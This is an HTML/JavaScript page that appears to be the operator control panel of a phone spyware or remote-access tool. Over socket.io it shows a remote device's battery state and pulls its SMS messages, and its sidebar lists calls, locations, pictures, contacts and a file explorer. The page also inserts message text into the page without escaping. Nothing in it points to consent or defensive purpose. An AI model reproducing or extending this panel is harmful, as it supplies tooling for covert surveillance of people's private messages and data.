<!DOCTYPE html>
<html>
<head>
    <title>System Control Panel</title>
    <script src="/socket.io/socket.io.js"></script>
    <style>
        :root {
            --sidebar-bg: #34495e; --main-bg: #f5f5f5; --accent: #1abc9c;
            --blue: #3498db; --purple: #9b59b6; --yellow: #f1c40f;
        }
        body { font-family: 'Segoe UI', sans-serif; background: var(--main-bg); margin: 0; display: flex; }

        /* SIDEBAR */
        .sidebar { width: 250px; background: var(--sidebar-bg); color: #bdc3c7; position: fixed; height: 100vh; z-index: 1000;}
        .sidebar-header { background: var(--accent); color: white; padding: 20px; font-weight: bold; }
        .nav-item { padding: 15px 20px; cursor: pointer; border-bottom: 1px solid #2c3e50; transition: 0.3s; }
        .nav-item:hover, .nav-item.active { background: #2c3e50; color: white; }

        /* CONTENT */
        .main-content { margin-left: 250px; flex-grow: 1; }
        .top-nav { height: 70px; background: white; display: flex; justify-content: flex-end; align-items: center; padding: 0 40px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); position: sticky; top: 0; z-index: 500;}
        
        /* TECHNICAL BATTERY STACKING */
        .battery-container {
            display: flex;
            align-items: center;
            gap: 12px;
        }
        .battery-box { 
            padding: 6px 15px; border-radius: 5px; font-weight: bold; font-size: 1.2rem; 
        }
        .online { background: #d4efdf; color: #145a32; }
        .offline { background: #fadbd8; color: #7b241c; }

        .icon-stack {
            position: relative;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            font-size: 2.2rem;
        }
        #unplugged-icon { color: #27ae60; }
        #charging-bolt {
            position: absolute;
            font-size: 1.4rem;
            color: #f1c40f;
            display: none; /* Controlled by JS */
            text-shadow: 0 0 5px rgba(0,0,0,0.5);
            animation: pulse 1.5s infinite;
        }

        @keyframes pulse {
            0% { transform: scale(1); opacity: 1; }
            50% { transform: scale(1.2); opacity: 0.8; }
            100% { transform: scale(1); opacity: 1; }
        }

        /* GRID DASHBOARD */
        .view-section { display: none; padding: 30px; }
        .view-section.active { display: block; }
        .grid-layout { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 15px; }
        .dash-card { height: 120px; padding: 20px; color: white; border-radius: 4px; cursor: pointer; display: flex; justify-content: space-between; align-items: center; transition: 0.3s;}
        .dash-card:hover { transform: translateY(-3px); box-shadow: 0 5px 15px rgba(0,0,0,0.2); }
        .sms-item { background: white; padding: 15px; margin-bottom: 10px; border-left: 5px solid var(--blue); border-radius: 4px; color: #333; box-shadow: 0 2px 5px rgba(0,0,0,0.05);}
    </style>
</head>
<body>

    <div class="sidebar">
        <div class="sidebar-header">üè† SYSTEM ADMIN</div>
        <div class="nav-item active" onclick="showView('dashboard')">üè† Dashboard</div>
        <div class="nav-item" onclick="showView('sms')">‚úâÔ∏è SMS Logs</div>
        <div class="nav-item">üñºÔ∏è MMS</div>
        <div class="nav-item">üìû Calls</div>
        <div class="nav-item">üìç Locations</div>
        <div class="nav-item">üì∑ Pictures</div>
        <div class="nav-item">üéÆ Apps</div>
        <div class="nav-item">üìñ Contacts</div>
        <div class="nav-item">üåê Site Web</div>
        <div class="nav-item">üìÇ File Explorer</div>
    </div>

    <div class="main-content">
        <div class="top-nav">
            <div class="battery-container">
                <div id="bat-box" class="battery-box offline"><span id="bat-pct">--</span>%</div>
                <div class="icon-stack">
                    <span id="unplugged-icon">üîã</span>
                    <span id="charging-bolt">‚ö°</span>
                </div>
            </div>
        </div>

        <section id="dashboard" class="view-section active">
            <h2 style="color: #7f8c8d; font-weight: 300;">Dashboard</h2>
            <div class="grid-layout">
                <div class="dash-card" style="background:var(--blue)" onclick="showView('sms')">
                    <div style="font-size: 3rem; opacity: 0.3;">‚úâÔ∏è</div>
                    <div style="text-align: right;">
                        <span id="sms-count" style="font-size: 2.5rem; display: block; font-weight: bold;">0</span>
                        <span style="font-size: 0.8rem; font-weight: bold;">SMS LOGS</span>
                    </div>
                </div>
            </div>
        </section>

        <section id="sms" class="view-section">
            <h2 style="color: #7f8c8d; font-weight: 300;">SMS Messages</h2>
            <div id="sms-container">Waiting for device data...</div>
        </section>
    </div>

    <script>
        const socket = io();

        function showView(viewId) {
            document.querySelectorAll('.view-section').forEach(s => s.classList.remove('active'));
            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
            document.getElementById(viewId).classList.add('active');
            
            // Set clicked sidebar item as active
            event.currentTarget.classList.add('active');

            if(viewId === 'sms') socket.emit('get-sms-request');
        }

        socket.on('ui-battery', (data) => {
            const pct = (typeof data === 'object') ? data.percent : data;
            const charging = (typeof data === 'object') ? data.charging : false;
            
            document.getElementById('bat-pct').innerText = pct;
            document.getElementById('bat-box').className = "battery-box online";
            
            // Show bolt overlaying the battery if charging
            document.getElementById('charging-bolt').style.display = charging ? "block" : "none";
        });

        socket.on('ui-sms-display', (smsArray) => {
            document.getElementById('sms-count').innerText = smsArray.length;
            const container = document.getElementById('sms-container');
            container.innerHTML = smsArray.map(m => `
                <div class="sms-item">
                    <strong>${m.address}</strong><br>
                    <span style="display:block; margin: 5px 0;">${m.body}</span>
                    <small style="color: #999;">${new Date(m.date).toLocaleString()}</small>
                </div>
            `).join('');
        });

        socket.on('device-status', (status) => {
            if (!status.online) {
                document.getElementById('bat-box').className = "battery-box offline";
                document.getElementById('bat-pct').innerText = "--";
                document.getElementById('charging-bolt').style.display = "none";
            }
        });
    </script>
</body>
</html>
